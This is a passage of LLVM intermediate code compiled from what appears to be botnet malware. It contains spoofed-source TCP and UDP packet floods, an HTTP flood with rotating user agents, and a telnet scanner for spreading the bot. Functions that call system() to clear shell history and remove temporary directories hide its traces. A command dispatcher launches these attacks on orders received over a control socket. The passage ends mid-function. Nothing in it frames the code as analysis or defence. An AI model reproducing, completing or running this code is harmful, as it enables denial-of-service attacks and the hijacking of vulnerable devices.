; <label>:63:                                     ; preds = %39
  %64 = trunc i32 %1 to i16
  %65 = call zeroext i16 @htons(i16 zeroext %64) #15
  %66 = zext i16 %65 to i32
  br label %67

; <label>:67:                                     ; preds = %63, %61
  %.pre-phi = phi i16 [ %64, %63 ], [ 0, %61 ]
  %68 = phi i32 [ %66, %63 ], [ %62, %61 ]
  %69 = trunc i32 %68 to i16
  %70 = getelementptr inbounds i8, i8* %45, i64 22
  %71 = bitcast i8* %70 to i16*
  store i16 %69, i16* %71, align 2
  %72 = getelementptr inbounds i8, i8* %45, i64 26
  %73 = bitcast i8* %72 to i16*
  store i16 0, i16* %73, align 2
  %74 = getelementptr inbounds i8, i8* %45, i64 28
  call void @makeRandomStr(i8* %74, i32 %3)
  %75 = bitcast i8* %45 to i16*
  %76 = getelementptr inbounds i8, i8* %45, i64 2
  %77 = bitcast i8* %76 to i16*
  %78 = load i16, i16* %77, align 2
  %79 = zext i16 %78 to i32
  %80 = call zeroext i16 @csum(i16* nonnull %75, i32 %79)
  %81 = getelementptr inbounds i8, i8* %45, i64 10
  %82 = bitcast i8* %81 to i16*
  store i16 %80, i16* %82, align 2
  %83 = call i64 @time(i64* null) #7
  %84 = zext i32 %2 to i64
  %85 = add i64 %83, %84
  %86 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %87 = getelementptr inbounds i8, i8* %45, i64 4
  %88 = bitcast i8* %87 to i16*
  %89 = getelementptr inbounds i8, i8* %45, i64 12
  %90 = bitcast i8* %89 to i32*
  %sext = shl i64 %85, 32
  %91 = ashr exact i64 %sext, 32
  br i1 %10, label %.split.us.preheader, label %.split.preheader

.split.preheader:                                 ; preds = %67
  br label %.split

.split.us.preheader:                              ; preds = %67
  br label %.split.us

.split.us:                                        ; preds = %.split.us.backedge, %.split.us.preheader
  %.0.us = phi i32 [ 0, %.split.us.preheader ], [ %.0.us.be, %.split.us.backedge ]
  %92 = call i64 @sendto(i32 %25, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %86, i32 16) #7
  %93 = call i32 @rand_cmwc()
  %94 = trunc i32 %93 to i16
  store i16 %94, i16* %60, align 4
  %95 = call i32 @rand_cmwc()
  %96 = trunc i32 %95 to i16
  store i16 %96, i16* %71, align 2
  %97 = call i32 @rand_cmwc()
  %98 = trunc i32 %97 to i16
  store i16 %98, i16* %88, align 4
  %99 = call i32 @getRandomIP(i32 %41)
  %100 = call i32 @htonl(i32 %99) #15
  store i32 %100, i32* %90, align 4
  %101 = load i16, i16* %77, align 2
  %102 = zext i16 %101 to i32
  %103 = call zeroext i16 @csum(i16* nonnull %75, i32 %102)
  store i16 %103, i16* %82, align 2
  %104 = icmp eq i32 %.0.us, %4
  br i1 %104, label %107, label %105

; <label>:105:                                    ; preds = %.split.us
  %106 = add i32 %.0.us, 1
  br label %.split.us.backedge

; <label>:107:                                    ; preds = %.split.us
  %108 = call i64 @time(i64* null) #7
  %109 = icmp sgt i64 %108, %91
  br i1 %109, label %.us-lcssa.us.loopexit, label %.split.us.backedge

.split.us.backedge:                               ; preds = %107, %105
  %.0.us.be = phi i32 [ %106, %105 ], [ 0, %107 ]
  br label %.split.us

.split:                                           ; preds = %.split.backedge, %.split.preheader
  %.0 = phi i32 [ 0, %.split.preheader ], [ %.0.be, %.split.backedge ]
  %110 = call i64 @sendto(i32 %25, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %86, i32 16) #7
  %111 = call i32 @rand_cmwc()
  %112 = trunc i32 %111 to i16
  store i16 %112, i16* %60, align 4
  %113 = call zeroext i16 @htons(i16 zeroext %.pre-phi) #15
  store i16 %113, i16* %71, align 2
  %114 = call i32 @rand_cmwc()
  %115 = trunc i32 %114 to i16
  store i16 %115, i16* %88, align 4
  %116 = call i32 @getRandomIP(i32 %41)
  %117 = call i32 @htonl(i32 %116) #15
  store i32 %117, i32* %90, align 4
  %118 = load i16, i16* %77, align 2
  %119 = zext i16 %118 to i32
  %120 = call zeroext i16 @csum(i16* nonnull %75, i32 %119)
  store i16 %120, i16* %82, align 2
  %121 = icmp eq i32 %.0, %4
  br i1 %121, label %122, label %125

; <label>:122:                                    ; preds = %.split
  %123 = call i64 @time(i64* null) #7
  %124 = icmp sgt i64 %123, %91
  br i1 %124, label %.us-lcssa.us.loopexit45, label %.split.backedge

; <label>:125:                                    ; preds = %.split
  %126 = add i32 %.0, 1
  br label %.split.backedge

.split.backedge:                                  ; preds = %125, %122
  %.0.be = phi i32 [ %126, %125 ], [ 0, %122 ]
  br label %.split

.us-lcssa.us.loopexit:                            ; preds = %107
  br label %.us-lcssa.us

.us-lcssa.us.loopexit45:                          ; preds = %122
  br label %.us-lcssa.us

.us-lcssa.us:                                     ; preds = %.us-lcssa.us.loopexit45, %.us-lcssa.us.loopexit
  call void @llvm.stackrestore(i8* %44)
  br label %127

; <label>:127:                                    ; preds = %22, %17, %27, %.us-lcssa.us
  ret void
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #7

; Function Attrs: noinline nounwind uwtable
define void @RemoveTempDirs() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.291, i64 0, i64 0)) #7
  %2 = tail call i32 @system(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.292, i64 0, i64 0)) #7
  %3 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.293, i64 0, i64 0)) #7
  %4 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.294, i64 0, i64 0)) #7
  %5 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.295, i64 0, i64 0)) #7
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @SendTCP(i8*, i32, i32, i8*, i32, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #15
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %144

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #7
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %144, label %28

; <label>:28:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %29 = bitcast i32* %9 to i8*
  %30 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %29, i32 4) #7
  %31 = icmp slt i32 %30, 0
  br i1 %31, label %144, label %32

; <label>:32:                                     ; preds = %28
  %33 = icmp eq i32 %6, 0
  %34 = sub nsw i32 32, %6
  %35 = shl i32 -1, %34
  %.074 = select i1 %33, i32 0, i32 %35
  %36 = sext i32 %4 to i64
  %37 = add nsw i64 %36, 40
  %38 = call i8* @llvm.stacksave()
  %39 = alloca i8, i64 %37, align 16
  %40 = bitcast i8* %39 to %struct.iphdr*
  %41 = getelementptr i8, i8* %39, i64 20
  %42 = bitcast i8* %41 to %struct.tcphdr*
  %43 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %44 = load i32, i32* %43, align 4
  %45 = call i32 @getRandomIP(i32 %.074)
  %46 = call i32 @htonl(i32 %45) #15
  %47 = add i32 %4, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %40, i32 %44, i32 %46, i8 zeroext 6, i32 %47)
  %48 = call i32 @rand_cmwc()
  %49 = trunc i32 %48 to i16
  %50 = bitcast i8* %41 to i16*
  store i16 %49, i16* %50, align 4
  %51 = call i32 @rand_cmwc()
  %52 = getelementptr inbounds i8, i8* %39, i64 24
  %53 = bitcast i8* %52 to i32*
  store i32 %51, i32* %53, align 8
  %54 = getelementptr inbounds i8, i8* %39, i64 28
  %55 = bitcast i8* %54 to i32*
  store i32 0, i32* %55, align 4
  %56 = getelementptr inbounds i8, i8* %39, i64 32
  %57 = bitcast i8* %56 to i16*
  %58 = load i16, i16* %57, align 16
  %59 = and i16 %58, -241
  %60 = or i16 %59, 80
  store i16 %60, i16* %57, align 16
  %61 = call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.296, i64 0, i64 0)) #14
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %65, label %.preheader

.preheader:                                       ; preds = %32
  %63 = call i8* @strtok(i8* %3, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i64 0, i64 0)) #7
  %64 = icmp eq i8* %63, null
  br i1 %64, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:65:                                     ; preds = %32
  %66 = and i16 %58, -8177
  %67 = or i16 %66, 8016
  store i16 %67, i16* %57, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge77
  %68 = phi i8* [ %83, %.backedge77 ], [ %63, %.lr.ph.preheader ]
  %69 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.298, i64 0, i64 0)) #14
  %70 = icmp eq i32 %69, 0
  br i1 %70, label %.sink.split, label %71

; <label>:71:                                     ; preds = %.lr.ph
  %72 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.299, i64 0, i64 0)) #14
  %73 = icmp eq i32 %72, 0
  br i1 %73, label %.sink.split, label %74

; <label>:74:                                     ; preds = %71
  %75 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.300, i64 0, i64 0)) #14
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %.sink.split, label %77

; <label>:77:                                     ; preds = %74
  %78 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.301, i64 0, i64 0)) #14
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %.sink.split, label %80

; <label>:80:                                     ; preds = %77
  %81 = call i32 @strcmp(i8* nonnull %68, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.302, i64 0, i64 0)) #14
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %.sink.split, label %.backedge77

.backedge77:                                      ; preds = %80, %.sink.split
  %83 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.297, i64 0, i64 0)) #7
  %84 = icmp eq i8* %83, null
  br i1 %84, label %.loopexit.loopexit, label %.lr.ph

.sink.split:                                      ; preds = %80, %77, %74, %71, %.lr.ph
  %.sink7 = phi i16 [ -513, %.lr.ph ], [ -1025, %71 ], [ -257, %74 ], [ -4097, %77 ], [ -2049, %80 ]
  %.sink5 = phi i16 [ 512, %.lr.ph ], [ 1024, %71 ], [ 256, %74 ], [ 4096, %77 ], [ 2048, %80 ]
  %85 = load i16, i16* %57, align 16
  %86 = and i16 %85, %.sink7
  %87 = or i16 %86, %.sink5
  store i16 %87, i16* %57, align 16
  br label %.backedge77

.loopexit.loopexit:                               ; preds = %.backedge77
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %65
  %88 = call i32 @rand_cmwc()
  %89 = trunc i32 %88 to i16
  %90 = getelementptr inbounds i8, i8* %39, i64 34
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 2
  %92 = getelementptr inbounds i8, i8* %39, i64 36
  %93 = bitcast i8* %92 to i16*
  store i16 0, i16* %93, align 4
  %94 = getelementptr inbounds i8, i8* %39, i64 38
  %95 = bitcast i8* %94 to i16*
  store i16 0, i16* %95, align 2
  br i1 %11, label %96, label %98

; <label>:96:                                     ; preds = %.loopexit
  %97 = call i32 @rand_cmwc()
  br label %102

; <label>:98:                                     ; preds = %.loopexit
  %99 = trunc i32 %1 to i16
  %100 = call zeroext i16 @htons(i16 zeroext %99) #15
  %101 = zext i16 %100 to i32
  br label %102

; <label>:102:                                    ; preds = %98, %96
  %103 = phi i32 [ %97, %96 ], [ %101, %98 ]
  %104 = trunc i32 %103 to i16
  %105 = getelementptr inbounds i8, i8* %39, i64 22
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %107, i16* %93, align 4
  %108 = bitcast i8* %39 to i16*
  %109 = getelementptr inbounds i8, i8* %39, i64 2
  %110 = bitcast i8* %109 to i16*
  %111 = load i16, i16* %110, align 2
  %112 = zext i16 %111 to i32
  %113 = call zeroext i16 @csum(i16* nonnull %108, i32 %112)
  %114 = getelementptr inbounds i8, i8* %39, i64 10
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = call i64 @time(i64* null) #7
  %117 = zext i32 %2 to i64
  %118 = add i64 %116, %117
  %119 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %120 = getelementptr inbounds i8, i8* %39, i64 12
  %121 = bitcast i8* %120 to i32*
  %122 = getelementptr inbounds i8, i8* %39, i64 4
  %123 = bitcast i8* %122 to i16*
  %sext = shl i64 %118, 32
  %124 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %102
  %.0 = phi i32 [ 0, %102 ], [ %.0.be, %.backedge.backedge ]
  %125 = call i64 @sendto(i32 %26, i8* nonnull %39, i64 %37, i32 0, %struct.sockaddr* nonnull %119, i32 16) #7
  %126 = call i32 @getRandomIP(i32 %.074)
  %127 = call i32 @htonl(i32 %126) #15
  store i32 %127, i32* %121, align 4
  %128 = call i32 @rand_cmwc()
  %129 = trunc i32 %128 to i16
  store i16 %129, i16* %123, align 4
  %130 = call i32 @rand_cmwc()
  store i32 %130, i32* %53, align 8
  %131 = call i32 @rand_cmwc()
  %132 = trunc i32 %131 to i16
  store i16 %132, i16* %50, align 4
  store i16 0, i16* %93, align 4
  %133 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %40, %struct.tcphdr* nonnull %42)
  store i16 %133, i16* %93, align 4
  %134 = load i16, i16* %110, align 2
  %135 = zext i16 %134 to i32
  %136 = call zeroext i16 @csum(i16* nonnull %108, i32 %135)
  store i16 %136, i16* %115, align 2
  %137 = icmp eq i32 %.0, %5
  br i1 %137, label %138, label %141

; <label>:138:                                    ; preds = %.backedge
  %139 = call i64 @time(i64* null) #7
  %140 = icmp sgt i64 %139, %124
  br i1 %140, label %143, label %.backedge.backedge

; <label>:141:                                    ; preds = %.backedge
  %142 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %141, %138
  %.0.be = phi i32 [ %142, %141 ], [ 0, %138 ]
  br label %.backedge

; <label>:143:                                    ; preds = %138
  call void @llvm.stackrestore(i8* %38)
  br label %144

; <label>:144:                                    ; preds = %23, %18, %28, %143
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  store i32 1, i32* %4, align 4
  %5 = tail call %struct.hostent* @gethostbyname(i8* %0) #7
  %6 = icmp eq %struct.hostent* %5, null
  br i1 %6, label %27, label %7

; <label>:7:                                      ; preds = %2
  %8 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 4
  %9 = load i8**, i8*** %8, align 8
  %10 = load i8*, i8** %9, align 8
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 2
  %12 = bitcast %struct.in_addr* %11 to i8*
  %13 = getelementptr inbounds %struct.hostent, %struct.hostent* %5, i64 0, i32 3
  %14 = load i32, i32* %13, align 4
  %15 = sext i32 %14 to i64
  call void @bcopy(i8* %10, i8* %12, i64 %15) #7
  %16 = tail call zeroext i16 @htons(i16 zeroext %1) #15
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i64 0, i32 0
  store i16 2, i16* %18, align 4
  %19 = tail call i32 @socket(i32 2, i32 1, i32 6) #7
  %20 = bitcast i32* %4 to i8*
  %21 = call i32 @setsockopt(i32 %19, i32 6, i32 1, i8* nonnull %20, i32 4) #7
  %22 = icmp eq i32 %19, -1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %7
  %24 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %19, %struct.sockaddr* nonnull %24, i32 16) #7
  %26 = icmp eq i32 %25, -1
  %. = select i1 %26, i32 0, i32 %19
  br label %27

; <label>:27:                                     ; preds = %23, %7, %2
  %.0 = phi i32 [ 0, %2 ], [ 0, %7 ], [ %., %23 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = alloca [1 x i8], align 1
  %9 = tail call i64 @time(i64* null) #7
  %10 = zext i32 %4 to i64
  %11 = add i64 %9, %10
  %12 = icmp sgt i32 %5, 0
  br i1 %12, label %.lr.ph15, label %._crit_edge16

.lr.ph15:                                         ; preds = %6
  %13 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  br label %16

; <label>:14:                                     ; preds = %16
  %15 = icmp slt i32 %25, %5
  br i1 %15, label %16, label %._crit_edge16.loopexit

; <label>:16:                                     ; preds = %.lr.ph15, %14
  %.013 = phi i32 [ 0, %.lr.ph15 ], [ %25, %14 ]
  %17 = tail call i32 @rand() #7
  %18 = srem i32 %17, 36
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds [36 x i8*], [36 x i8*]* @UserAgents, i64 0, i64 %19
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %13, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.303, i64 0, i64 0), i8* %0, i8* %3, i8* %1, i8* %21) #7
  %23 = tail call i32 @fork() #7
  %24 = icmp eq i32 %23, 0
  %25 = add nuw nsw i32 %.013, 1
  br i1 %24, label %14, label %.preheader

.preheader:                                       ; preds = %16
  %sext = shl i64 %11, 32
  %26 = ashr exact i64 %sext, 32
  %27 = tail call i64 @time(i64* null) #7
  %28 = icmp sgt i64 %26, %27
  br i1 %28, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %.preheader
  %29 = getelementptr inbounds [1 x i8], [1 x i8]* %8, i64 0, i64 0
  br label %30

; <label>:30:                                     ; preds = %.lr.ph, %.backedge
  %31 = tail call i32 @socket_connect(i8* %1, i16 zeroext %2)
  %32 = icmp eq i32 %31, 0
  br i1 %32, label %.backedge, label %33

; <label>:33:                                     ; preds = %30
  %34 = call i64 @strlen(i8* nonnull %13) #14
  %35 = call i64 @write(i32 %31, i8* nonnull %13, i64 %34) #7
  %36 = call i64 @read(i32 %31, i8* nonnull %29, i64 1) #7
  %37 = tail call i32 @close(i32 %31) #7
  br label %.backedge

.backedge:                                        ; preds = %33, %30
  %38 = tail call i64 @time(i64* null) #7
  %39 = icmp sgt i64 %26, %38
  br i1 %39, label %30, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @exit(i32 0) #16
  unreachable

._crit_edge16.loopexit:                           ; preds = %14
  br label %._crit_edge16

._crit_edge16:                                    ; preds = %._crit_edge16.loopexit, %6
  ret void
}

declare i64 @read(i32, i8* nocapture, i64) local_unnamed_addr #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #13

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.295, i64 0, i64 0)) #7
  %2 = tail call i32 @system(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.304, i64 0, i64 0)) #7
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.305, i64 0, i64 0)) #14
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %268, label %6

; <label>:6:                                      ; preds = %2
  %7 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.306, i64 0, i64 0)) #14
  %8 = icmp eq i32 %7, 0
  br i1 %8, label %9, label %66

; <label>:9:                                      ; preds = %6
  %10 = getelementptr inbounds i8*, i8** %1, i64 1
  %11 = load i8*, i8** %10, align 8
  %12 = tail call i32 @strcmp(i8* %11, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.307, i64 0, i64 0)) #14
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %14, label %38

; <label>:14:                                     ; preds = %9
  %15 = tail call i32 @fork() #7
  %16 = tail call i64 @sysconf(i32 84) #7
  %17 = trunc i64 %16 to i32
  %18 = icmp eq i32 %17, 1
  %. = select i1 %18, i32 500, i32 999999
  %19 = icmp sgt i32 %17, 1
  %.. = select i1 %19, i32 1000, i32 %.
  %20 = icmp eq i32 %15, 0
  br i1 %20, label %22, label %21

; <label>:21:                                     ; preds = %14
  store i32 %15, i32* @scanPid, align 4
  br label %268

; <label>:22:                                     ; preds = %14
  %23 = icmp sgt i32 %17, 0
  br i1 %23, label %24, label %._crit_edge

._crit_edge:                                      ; preds = %22
  %.pre = load i8*, i8** %10, align 8
  br label %38

; <label>:24:                                     ; preds = %22
  %25 = tail call i64 @time(i64* null) #7
  %26 = tail call i32 @getpid() #7
  %27 = zext i32 %26 to i64
  %28 = xor i64 %27, %25
  %29 = tail call i32 @getppid() #7
  %30 = zext i32 %29 to i64
  %31 = add i64 %28, %30
  %32 = trunc i64 %31 to i32
  tail call void @srand(i32 %32) #7
  %33 = tail call i64 @time(i64* null) #7
  %34 = tail call i32 @getpid() #7
  %35 = zext i32 %34 to i64
  %36 = xor i64 %35, %33
  %37 = trunc i64 %36 to i32
  tail call void @init_rand(i32 %37)
  tail call void @TelnetScanner(i32 100, i32 %..)
  unreachable

; <label>:38:                                     ; preds = %._crit_edge, %9
  %39 = phi i8* [ %.pre, %._crit_edge ], [ %11, %9 ]
  %40 = tail call i32 @strcmp(i8* %39, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.308, i64 0, i64 0)) #14
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %47

; <label>:42:                                     ; preds = %38
  %43 = load i32, i32* @scanPid, align 4
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %268, label %45

; <label>:45:                                     ; preds = %42
  %46 = tail call i32 @kill(i32 %43, i32 9) #7
  store i32 0, i32* @scanPid, align 4
  %.pre138 = load i8*, i8** %10, align 8
  br label %47

; <label>:47:                                     ; preds = %38, %45
  %48 = phi i8* [ %39, %38 ], [ %.pre138, %45 ]
  %49 = tail call i32 @strcmp(i8* %48, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.309, i64 0, i64 0)) #14
  %50 = icmp eq i32 %49, 0
  br i1 %50, label %51, label %._crit_edge139

._crit_edge139:                                   ; preds = %47
  %.pre140 = load i8*, i8** %1, align 8
  br label %66

; <label>:51:                                     ; preds = %47
  %52 = icmp slt i32 %0, 3
  br i1 %52, label %53, label %56

; <label>:53:                                     ; preds = %51
  %54 = load i32, i32* @mainCommSock, align 4
  %55 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %54, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.310, i64 0, i64 0))
  br label %268

; <label>:56:                                     ; preds = %51
  %57 = tail call i32 @atoi(i8* %48) #14
  %58 = getelementptr inbounds i8*, i8** %1, i64 2
  %59 = load i8*, i8** %58, align 8
  %60 = tail call i32 @atoi(i8* %59) #14
  %61 = tail call i32 @listFork()
  %62 = icmp eq i32 %61, 0
  br i1 %62, label %63, label %268

; <label>:63:                                     ; preds = %56
  %64 = load i32, i32* @mainCommSock, align 4
  %65 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %64, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.311, i64 0, i64 0))
  tail call void @TelnetScanner(i32 %60, i32 %57)
  unreachable

; <label>:66:                                     ; preds = %._crit_edge139, %6
  %67 = phi i8* [ %.pre140, %._crit_edge139 ], [ %3, %6 ]
  %68 = tail call i32 @strcmp(i8* %67, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.312, i64 0, i64 0)) #14
  %69 = icmp eq i32 %68, 0
  br i1 %69, label %70, label %100

; <label>:70:                                     ; preds = %66
  %71 = icmp slt i32 %0, 6
  br i1 %71, label %268, label %72

; <label>:72:                                     ; preds = %70
  %73 = getelementptr inbounds i8*, i8** %1, i64 3
  %74 = load i8*, i8** %73, align 8
  %75 = tail call i32 @atoi(i8* %74) #14
  %76 = icmp slt i32 %75, 1
  br i1 %76, label %268, label %77

; <label>:77:                                     ; preds = %72
  %78 = getelementptr inbounds i8*, i8** %1, i64 5
  %79 = load i8*, i8** %78, align 8
  %80 = tail call i32 @atoi(i8* %79) #14
  %81 = icmp slt i32 %80, 1
  br i1 %81, label %268, label %82

; <label>:82:                                     ; preds = %77
  %83 = tail call i32 @listFork()
  %84 = icmp eq i32 %83, 0
  br i1 %84, label %85, label %268

; <label>:85:                                     ; preds = %82
  %86 = getelementptr inbounds i8*, i8** %1, i64 1
  %87 = load i8*, i8** %86, align 8
  %88 = getelementptr inbounds i8*, i8** %1, i64 2
  %89 = load i8*, i8** %88, align 8
  %90 = load i8*, i8** %73, align 8
  %91 = tail call i32 @atoi(i8* %90) #14
  %92 = trunc i32 %91 to i16
  %93 = getelementptr inbounds i8*, i8** %1, i64 4
  %94 = load i8*, i8** %93, align 8
  %95 = load i8*, i8** %78, align 8
  %96 = tail call i32 @atoi(i8* %95) #14
  %97 = getelementptr inbounds i8*, i8** %1, i64 6
  %98 = load i8*, i8** %97, align 8
  %99 = tail call i32 @atoi(i8* %98) #14
  tail call void @sendHTTP(i8* %87, i8* %89, i16 zeroext %92, i8* %94, i32 %96, i32 %99)
  tail call void @exit(i32 0) #16
  unreachable

; <label>:100:                                    ; preds = %66
  %101 = tail call i32 @strcmp(i8* %67, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.313, i64 0, i64 0)) #14
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %.loopexit127

; <label>:103:                                    ; preds = %100
  %104 = icmp slt i32 %0, 6
  br i1 %104, label %268, label %105

; <label>:105:                                    ; preds = %103
  %106 = getelementptr inbounds i8*, i8** %1, i64 3
  %107 = load i8*, i8** %106, align 8
  %108 = tail call i32 @atoi(i8* %107) #14
  %109 = icmp eq i32 %108, -1
  br i1 %109, label %268, label %110

; <label>:110:                                    ; preds = %105
  %111 = getelementptr inbounds i8*, i8** %1, i64 2
  %112 = load i8*, i8** %111, align 8
  %113 = tail call i32 @atoi(i8* %112) #14
  %114 = icmp eq i32 %113, -1
  br i1 %114, label %268, label %115

; <label>:115:                                    ; preds = %110
  %116 = getelementptr inbounds i8*, i8** %1, i64 4
  %117 = load i8*, i8** %116, align 8
  %118 = tail call i32 @atoi(i8* %117) #14
  %119 = icmp eq i32 %118, -1
  %120 = icmp sgt i32 %118, 1024
  %or.cond = or i1 %119, %120
  br i1 %or.cond, label %268, label %121

; <label>:121:                                    ; preds = %115
  %122 = icmp eq i32 %0, 6
  br i1 %122, label %123, label %128

; <label>:123:                                    ; preds = %121
  %124 = getelementptr inbounds i8*, i8** %1, i64 5
  %125 = load i8*, i8** %124, align 8
  %126 = tail call i32 @atoi(i8* %125) #14
  %127 = icmp slt i32 %126, 1
  br i1 %127, label %268, label %128

; <label>:128:                                    ; preds = %123, %121
  %129 = getelementptr inbounds i8*, i8** %1, i64 1
  %130 = load i8*, i8** %129, align 8
  %131 = tail call i32 @atoi(i8* %112) #14
  %132 = tail call i32 @atoi(i8* %107) #14
